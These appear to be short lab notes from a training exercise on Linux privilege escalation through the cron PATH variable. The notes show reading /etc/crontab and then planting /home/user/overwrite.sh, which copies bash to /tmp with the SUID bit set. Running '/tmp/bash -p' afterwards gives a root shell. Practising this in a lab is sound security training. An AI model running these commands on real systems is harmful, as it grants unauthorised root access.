**Detection**

Linux VM

1. In command prompt type: 
   
```
cat /etc/crontab
```

![[Pasted image 20240602232659.png]]


2. From the output, notice the value of the “PATH” variable.

**Exploitation**

Linux VM

1. In command prompt type:

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
```

2. In command prompt type: 
   
```
chmod +x /home/user/overwrite.sh
```

3. Wait 1 minute for the Bash script to execute.

4. In command prompt type:
   
```
 /tmp/bash -p
```

5. In command prompt type: 
   
```
id
```

![[Pasted image 20240602232738.png]]


Answer the questions below

Click 'Completed' once you have successfully elevated the machine
